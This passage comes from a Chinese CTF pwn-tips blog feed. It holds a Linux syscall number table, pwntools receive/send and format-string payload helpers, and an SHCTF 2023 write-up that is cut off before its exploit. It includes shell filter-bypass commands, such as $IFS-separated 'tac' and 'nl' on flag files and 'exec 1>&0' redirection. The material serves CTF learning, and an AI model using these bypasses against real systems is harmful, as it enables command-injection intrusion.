class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigqueueinfo 129</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_rt_sigsuspend 130</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sigaltstack 131</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utime 132</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknod 133</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_uselib 134</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_personality 135</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ustat 136</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_statfs 137</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fstatfs 138</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sysfs 139</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpriority 140</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setpriority 141</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setparam 142</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getparam 143</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setscheduler 144</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getscheduler 145</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_max 146</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_get_priority_min 147</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_rr_get_interval 148</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlock 149</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlock 150</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mlockall 151</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_munlockall 152</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vhangup 153</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_modify_ldt 154</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pivot_root 155</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR__sysctl 156</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_prctl 157</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_arch_prctl 158</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_adjtimex 159</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setrlimit 160</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_chroot 161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync 162</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_acct 163</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_settimeofday 164</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mount 165</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_umount2 166</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapon 167</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_swapoff 168</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_reboot 169</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sethostname 170</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setdomainname 171</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_iopl 172</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioperm 173</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_create_module 174</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_init_module 175</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_delete_module 176</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_kernel_syms 177</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_query_module 178</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_quotactl 179</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_nfsservctl 180</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getpmsg 181</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_putpmsg 182</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_afs_syscall 183</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tuxcall 184</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_security 185</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_gettid 186</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readahead 187</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_setxattr 188</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lsetxattr 189</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fsetxattr 190</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getxattr 191</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lgetxattr 192</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fgetxattr 193</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_listxattr 194</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_llistxattr 195</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_flistxattr 196</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_removexattr 197</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lremovexattr 198</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fremovexattr 199</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tkill 200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_time 201</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futex 202</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_setaffinity 203</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sched_getaffinity 204</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_thread_area 205</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_setup 206</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_destroy 207</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_getevents 208</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_submit 209</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_io_cancel 210</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_thread_area 211</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_lookup_dcookie 212</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_create 213</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl_old 214</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait_old 215</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_remap_file_pages 216</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_getdents64 217</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_tid_address 218</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_restart_syscall 219</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_semtimedop 220</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fadvise64 221</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_create 222</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_settime 223</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_gettime 224</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_getoverrun 225</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_timer_delete 226</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_settime 227</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_gettime 228</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_getres 229</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_clock_nanosleep 230</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_exit_group 231</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_wait 232</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_ctl 233</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_tgkill 234</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimes 235</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vserver 236</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mbind 237</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_mempolicy 238</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_mempolicy 239</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_open 240</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_unlink 241</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedsend 242</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_timedreceive 243</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_notify 244</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mq_getsetattr 245</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_kexec_load 246</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_waitid 247</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_add_key 248</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_request_key 249</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_keyctl 250</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_set 251</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ioprio_get 252</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_init 253</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_add_watch 254</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_inotify_rm_watch 255</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_migrate_pages 256</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_openat 257</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mkdirat 258</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_mknodat 259</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchownat 260</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_futimesat 261</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_newfstatat 262</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unlinkat 263</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_renameat 264</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_linkat 265</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_symlinkat 266</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_readlinkat 267</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_fchmodat 268</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_faccessat 269</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_pselect6 270</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_ppoll 271</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_unshare 272</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_set_robust_list 273</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_get_robust_list 274</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_splice 275</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sync_file_range 277</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_vmsplice 278</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_move_pages 279</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_utimensat 280</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_epoll_pwait 281</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __NR_sign</span></span><br></pre></td></tr></table></figure>

<hr>
<h2><span id="arch-参数说明">arch 参数说明</span></h2><h3><span id="archx3d39i38639"><strong>arch&#x3D;&#39;i386&#39;</strong></span></h3><blockquote>
<p>arch&#x3D;&#39;i386&#39; 表示目标二进制文件是一个 32 位的 x86 架构的程序。i386 是 Intel 80386 处理器的简称，它是第一个支持 32 位计算的 x86 处理器。在这里，i386 用来表示目标程序是一个 32 位的 x86 程序。 在使用 pwntools 库进行二进制漏洞利用时，需要正确设置目标架构和操作系统，以便库能够正确地生成 shellcode、ROP 链等攻击负载。如果目标程序是一个 32 位的 x86 程序，那么应该将 arch 设置为 &#39;i386&#39;。</p>
</blockquote>
<h3><span id="archx3d39amd6439"><strong>arch&#x3D;&#39;amd64&#39;</strong></span></h3><blockquote>
<p>arch&#x3D;&#39;amd64&#39; 表示目标二进制文件是一个 64 位的 x86-64 架构的程序。amd64 是 AMD 公司推出的一种 64 位处理器架构，它扩展了原有的 x86 架构，支持 64 位计算。在这里，amd64 用来表示目标程序是一个 64 位的 x86-64 程序。 与 i386 类似，在使用 pwntools库&amp;spm&#x3D;1001.2101.3001.7020进行二进制漏洞利用时，需要正确设置目标架构和操作系统，以便库能够正确地生成 shellcode、ROP 链等攻击负载。如果目标程序是一个 64 位的 x86-64 程序，那么应该将 arch 设置为 &#39;amd64&#39;。</p>
</blockquote>
<hr>
<h2><span id="编码-x2f-解码">编码 &#x2F; 解码</span></h2><h3><span id="base64-编码"><strong>Base64 编码：</strong></span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">base64</span> file</span><br><span class="line">功能：从指定的文件file中读取数据，编码为<span class="built_in">base64</span>的字符串然后输出；</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;string&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line">功能：将字符串string+换行编码为<span class="built_in">base64</span>的字符串然后输出；</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;string&#x27;</span> | <span class="built_in">base64</span></span><br><span class="line">功能：将字符串string编码为<span class="built_in">base64</span>的字符串然后输出；</span><br></pre></td></tr></table></figure>

<h3><span id="base64-解码"><strong>Base64 解码：</strong></span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">base64</span> -d file</span><br><span class="line">功能：从指定的文件file中读取已经过<span class="built_in">base64</span>编码的数据，然后进行解码，并输出解码后的字符串；</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;str&#x27;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">功能：对<span class="built_in">base64</span>编码的字符串str和空行进行解码，然后将解码后的字符串输出；</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> -n <span class="string">&#x27;str&#x27;</span> | <span class="built_in">base64</span> -d</span><br><span class="line">功能：对<span class="built_in">base64</span>编码的字符串str进行解码，然后将解码后的字符串输出；</span><br><span class="line"></span><br><span class="line">import <span class="built_in">base64</span></span><br><span class="line">key = <span class="string">&#x27;编码&#x27;</span></span><br><span class="line">key = base64.b64decode(key)</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(3)/1.png"></p>
<h3><span id="base32-解码"><strong>Base32 解码：</strong></span></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">import <span class="built_in">base64</span></span><br><span class="line">key = <span class="string">&#x27;编码&#x27;</span></span><br><span class="line">key = base64.b32decode(key)</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(3)/2.png"></p>
<hr>
<h1><span id="总结">总结：</span></h1><p>这次就记录了一些做 PWN 题时常见的编码与系统调用号，后续继续补充，加油！🔥🔥🔥</p>
]]></content>
      <categories>
        <category>技巧</category>
        <category>方法</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN PWN PWN !!! 技巧 (4)</title>
    <url>/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(4)/</url>
    <content><![CDATA[<p>PWN PWN PWN !!! 技巧 (4)</p>
<span id="more"></span>

<h1><span id="简介">简介:</span></h1><p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(1)/">PWN PWN PWN !!! 技巧 (1)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! 技巧 (2)</a></p>
<p><a href="https://xzz911.github.io/PWN%20PWN%20PWN%20!!!%20%E6%8A%80%E5%B7%A7%20(3)/">PWN PWN PWN !!! 技巧 (3)</a></p>
<p>紧接上述技巧（1）、技巧（2）和技巧（3），这次总结一些常用的命令、重定向和一些整数溢出需要了解的知识点，还有一些接收发送的命令。</p>
<hr>
<h2><span id="shell命令">shell命令</span></h2><p>（1）$IFS$1</p>
<p>它是一个 shell 变量，用于定义分隔符来进行单词分割。<code>$1</code> 是 shell 脚本中的位置参数，表示第一个参数。</p>
<p>（2）tac${IFS}f*</p>
<p><code>tac$&#123;IFS&#125;f*</code> 是一个 shell 命令，它使用 <code>tac</code> 命令来反向连接文件。<code>$&#123;IFS&#125;</code> 表示 IFS 变量的值，它用于在 <code>tac</code> 和 <code>f*</code> 之间添加分隔符。<code>f*</code> 是一个文件名模式，表示当前目录中以 f 开头的所有文件。</p>
<p>（3）nl${IFS}f*</p>
<p><code>nl$&#123;IFS&#125;f*</code> 是一个 shell 命令，它使用 <code>nl</code> 命令来为文件添加行号。<code>$&#123;IFS&#125;</code> 表示 IFS 变量的值，它用于在 <code>nl</code> 和 <code>f*</code> 之间添加分隔符。<code>f*</code> 是一个文件名模式，表示当前目录中以 f 开头的所有文件。</p>
<p>因此，这个命令的作用是为当前目录中以 f 开头的所有文件添加行号。</p>
<p>（4）tail .&#x2F;*</p>
<p><code>tail ./*</code> 是一个 shell 命令，它使用 <code>tail</code> 命令来显示文件的最后几行。<code>./</code> 表示当前目录，<code>*</code> 是一个通配符，表示当前目录中的所有文件和目录。</p>
<p>因此，这个命令的作用是显示当前目录中所有文件的最后几行。默认情况下，<code>tail</code> 命令显示每个文件的最后 10 行。</p>
<p>（5）重定向组合</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 1&gt;&amp;0 &amp;&amp; <span class="built_in">tac</span> fl*</span><br><span class="line"><span class="built_in">tac</span> fl* &gt;&amp;0</span><br><span class="line"><span class="built_in">tac</span> fl* &gt;&amp;2</span><br></pre></td></tr></table></figure>

<blockquote>
<p>解释见 FSCTF 2023 PWN</p>
</blockquote>
<hr>
<h2><span id="重定向">重定向</span></h2><p>在 Linux shell 中，<code>&gt;&amp;0</code>、<code>&gt;&amp;1</code> 和 <code>&gt;&amp;2</code> 都是重定向操作符，用于将输出重定向到不同的地方：</p>
<ul>
<li><code>&gt;&amp;0</code>：这个操作符将输出重定向到文件描述符0，也就是标准输入。然而，这通常没有什么实际用途，因为标准输入通常用于读取输入，而不是写入输出。</li>
<li><code>&gt;&amp;1</code>：这个操作符将输出重定向到文件描述符1，也就是标准输出。这是默认的输出目标，所以你通常不需要显式地使用这个操作符。然而，在某些情况下，你可能会想要将错误输出重定向到标准输出，那么你可以使用<code>2&gt;&amp;1</code>。</li>
<li><code>&gt;&amp;2</code>：这个操作符将输出重定向到文件描述符2，也就是标准错误输出。这通常用于输出错误信息。例如，如果你有一个命令可能会产生错误，你可以使用这个操作符将错误信息重定向到一个文件，如：<code>command 2&gt; error.txt</code>。</li>
</ul>
<p>常见示例：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">exec</span> 1&gt;&amp;0</span><br></pre></td></tr></table></figure>

<p>它将标准输出（文件描述符 1）重定向到标准输入（文件描述符 0）</p>
<hr>
<h2><span id="整数溢出">整数溢出</span></h2><p>整数溢出是指在计算机中对整数类型进行运算时，结果超出了该类型所能表示的范围。</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>范围</th>
<th>占用字节</th>
</tr>
</thead>
<tbody><tr>
<td><code>char</code></td>
<td>-128 ~ 127</td>
<td>1 字节</td>
</tr>
<tr>
<td><code>unsigned char</code></td>
<td>0 ~ 255</td>
<td>1 字节</td>
</tr>
<tr>
<td><code>short</code></td>
<td>-32768 ~ 32767</td>
<td>2 字节</td>
</tr>
<tr>
<td><code>unsigned short</code></td>
<td>0 ~ 65535</td>
<td>2 字节</td>
</tr>
<tr>
<td><code>int8</code></td>
<td>-128 ~ 127</td>
<td>1 字节</td>
</tr>
<tr>
<td><code>uint8</code></td>
<td>0 ~ 255</td>
<td>1 字节</td>
</tr>
<tr>
<td><code>int16</code></td>
<td>-32768 ~ 32767</td>
<td>2 字节</td>
</tr>
<tr>
<td><code>uint16</code></td>
<td>0 ~ 65535</td>
<td>2 字节</td>
</tr>
<tr>
<td><code>int32</code></td>
<td>-2147483648 ~ 2147483647</td>
<td>4 字节</td>
</tr>
<tr>
<td><code>uint32</code></td>
<td>0 ~ 4294967295</td>
<td>4 字节</td>
</tr>
<tr>
<td><code>int64</code></td>
<td>-9223372036854775808 ~ 9223372036854775807</td>
<td>8 字节</td>
</tr>
<tr>
<td><code>uint64</code></td>
<td>0 ~ 18446744073709551615</td>
<td>8 字节</td>
</tr>
<tr>
<td><code>long32</code></td>
<td>-2147483648 ~ 2147483647</td>
<td>4 字节</td>
</tr>
<tr>
<td><code>ulong32</code></td>
<td>0 ~ 4294967295</td>
<td>4 字节</td>
</tr>
<tr>
<td><code>long64</code></td>
<td>-9223372036854775808 ~ 9223372036854775807</td>
<td>8 字节</td>
</tr>
<tr>
<td><code>ulong64</code></td>
<td>0 ~ 18446744073709551615</td>
<td>8 字节</td>
</tr>
</tbody></table>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/1.png"></p>
<hr>
<h2><span id="pwntools">Pwntools</span></h2><p>利用 <code>pwntools</code> 工具来接收发送数据，在做题的时候我认为还是非常重要的，所以记录一手，大家一起共勉<del>_</del></p>
<p>发送数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.send(data)               <span class="comment"># 发送数据 data</span></span><br><span class="line">p.sendline(data)           <span class="comment"># 发送一行数据 data，加上换行符</span></span><br><span class="line">p.sendafter(data, payload) <span class="comment"># 接收到 data 后发送 payload</span></span><br><span class="line">p.sendlineafter(data, payload) <span class="comment"># 接收到 data 后发送 payload 并换行</span></span><br></pre></td></tr></table></figure>

<p>接收数据</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">p.recv(n)                  <span class="comment"># 接收指定 n 字节</span></span><br><span class="line">p.recvn(n)                 <span class="comment"># 接收 n 字符</span></span><br><span class="line">p.recvall()                <span class="comment"># 接收所有数据</span></span><br><span class="line">p.recvline()               <span class="comment"># 接收一行（到换行符）</span></span><br><span class="line">p.recvlines(n)             <span class="comment"># 接收 n 行</span></span><br><span class="line">p.recvuntil(data)          <span class="comment"># 接收到 data 为止</span></span><br><span class="line">p.recvuntil(data, drop=<span class="literal">True</span>)  <span class="comment"># 接收直到 data（如 &#x27;\nTell&#x27;）</span></span><br></pre></td></tr></table></figure>

<p>示例：如何接收到 <code>0x4038f64e0f1c4200</code></p>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/2.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="built_in">int</span>(p.recv(<span class="number">18</span>), <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 或者：</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">num = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>)</span><br><span class="line"><span class="comment"># 或者：</span></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">puts_addr = <span class="built_in">int</span>(p.recv(<span class="number">16</span>), <span class="number">16</span>)</span><br></pre></td></tr></table></figure>

<p><code>p.recv()</code> 和 <code>p.recvn()</code> 有什么区别</p>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/3.png"></p>
<p>32 位如何接受字符串</p>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/4.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line"><span class="comment"># 提取后 4 字节</span></span><br><span class="line">python切片：[-<span class="number">4</span>:]，代码可以确保仅提取接收到的数据的最后四个字节，而不考虑数据的前面部分</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/5.png"></p>
<p>64 位如何接受字符串</p>
<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/6.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">num = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:<span class="number">6</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># 或者</span></span><br><span class="line">num = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br></pre></td></tr></table></figure>

<p><img src="/images/PWNPWNPWN!!!%E6%8A%80%E5%B7%A7(4)/7.png"></p>
<hr>
<h2><span id="fmtstr">Fmtstr</span></h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">fmtstr_payload(offset, &#123;address:data&#125;, numbwritten=<span class="number">0</span>, write_size=<span class="string">&#x27;byte&#x27;</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li><code>offset</code>：格式化字符串偏移</li>
<li><code>numbwritten</code>：已经输出的字符数</li>
<li><code>write_size</code>：写入方式（<code>byte</code>&#x3D;<code>hhn</code>，<code>short</code>&#x3D;<code>hn</code>，<code>int</code>&#x3D;<code>n</code>），默认为 <code>byte</code></li>
</ul>
<blockquote>
<p>注意：部分题目限制时间，pwntools 生成的 payload 可能失效。
可通过修改低地址等方式减小输出长度，需手动构造 payload。</p>
</blockquote>
<hr>
<h1><span id="总结">总结：</span></h1><p>多做多总结，慢慢的要开始进攻堆了，加油加油，冲冲冲！！！</p>
]]></content>
      <categories>
        <category>技巧</category>
        <category>方法</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>SHCTF 2023 [WEEK 1] PWN</title>
    <url>/SHCTF%202023%20%5BWEEK%201%5D%20PWN/</url>
    <content><![CDATA[<p>SHCTF 2023 [WEEK 1] PWN</p>
<span id="more"></span>

<h1><span id="简介">简介</span></h1><p><strong>SHCTF - &quot;山河&quot;网络安全技能挑战赛</strong> 是由齐鲁工业大学、西安邮电大学、广东海洋大学、长春工程学院、郑州轻工业大学、河南大学、齐鲁师范学院、陕西邮电职业技术学院、陕西工业职业技术学院、商丘师范学院、咸阳师范学院（排名不分先后）等十所高校共同举办的 CTF 比赛。</p>
<p>完结撒花！！！这次比赛收获很大，新生赛往往会让你收获意想不到的知识点，挺好的，人民的好比赛，支持支持，明年再来 -_-，接下来会把比赛分周分享记录下来。</p>
<hr>
<h2><span id="nc">nc</span></h2><p>签到题，直接 <code>nc</code> 就完事了。</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/1.png"></p>
<hr>
<h2><span id="hard-nc">hard nc</span></h2><p>签到题，考察隐藏文件的查询（<code>ls -a</code>），然后就是 base64 解码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">flag&#123;636a6981-8e07-42ea-aa5e-bcd2bfb11441&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/2.png"></p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/3.png"></p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/4.png"></p>
<hr>
<h2><span id="四则计算器">四则计算器</span></h2><p>ida反汇编一下，代码审计发现出现了栈溢出，并且还有一个后门函数，想法就是先绕过 if 语句，再调用后门函数，获得shell</p>
<p><img src="/images/SHCTF2023%5BWEEK1%5DPWN/5.png"></p>
<p>exp如下：</p>
